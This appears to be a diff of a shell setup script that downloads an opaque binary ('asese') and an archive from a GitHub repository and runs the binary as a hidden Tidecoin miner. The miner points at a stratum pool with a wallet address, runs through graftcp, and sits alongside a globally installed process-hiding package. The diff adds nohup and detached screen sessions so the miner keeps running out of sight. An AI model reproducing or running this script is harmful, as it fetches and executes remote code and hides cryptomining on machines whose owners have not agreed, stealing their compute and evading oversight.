@@ -1,14 +1,11 @@
-apt update && apt -y install sudo wget curl unzip
+nohup apt update && nohup apt -y install nohup sudo wget curl unzip
+nohup sudo apt-get install screen -y
 
-sudo apt-get install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm
+nohup sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++
+nohup curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
+nohup apt-get install -y nodejs
 
 npm i -g node-process-hider
 
@@ -16,7 +13,7 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+nohup wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -47,4 +44,4 @@ echo " "
 ./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/asese
 chmod +x asese
 
-./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyRig8 --algo yespower --param-n 2048 --param-r 8 --param-key ""
+screen -d -m ./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.Mycuan1 --algo yespower --param-n 2048 --param-r 8 --param-key ""
